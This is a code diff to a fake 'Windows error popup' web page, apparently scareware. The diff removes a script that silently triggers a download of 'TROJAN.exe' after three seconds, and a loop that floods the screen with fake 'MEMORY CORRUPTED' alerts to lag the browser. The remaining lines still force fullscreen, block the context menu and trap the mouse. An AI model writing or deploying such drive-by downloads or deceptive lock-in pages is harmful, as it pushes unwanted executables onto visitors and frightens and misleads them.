@@ -18,21 +18,6 @@
             if (top !== self) top.location = self.location;
 
         </script>
-	<script>
-    // Wait 3 seconds, then attempt download
-    setTimeout(() => {
-        // Create invisible download link
-        const link = document.createElement('a');
-        link.href = 'TROJAN.exe'; // Path to your file
-        link.download = 'TROJAN.exe'; // Filename for user
-        link.style.display = 'none';
-        
-        // Trigger download
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-    }, 3000); // 3-second delay
-</script>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<title>Windows error popup</title>
@@ -313,20 +298,7 @@ function trapMouse() {
             Math.random() * 10 - 5
         );
     });
-
-    // Fake infinite loop to consume CPU (makes browser lag)
-    setInterval(() => {
-        const noise = document.createElement('div');
-        noise.style.position = 'fixed';
-        noise.style.top = Math.random() * 100 + 'vh';
-        noise.style.left = Math.random() * 100 + 'vw';
-        noise.style.color = 'red';
-        noise.textContent = '🛑 ALERT: MEMORY CORRUPTED';
-        document.body.appendChild(noise);
-        setTimeout(() => noise.remove(), 100);
-    }, 50);
-}
-
+	
 // ===== INITIALIZE =====
 document.addEventListener('click', enterFullscreen);
 document.addEventListener('contextmenu', (e) => e.preventDefault());
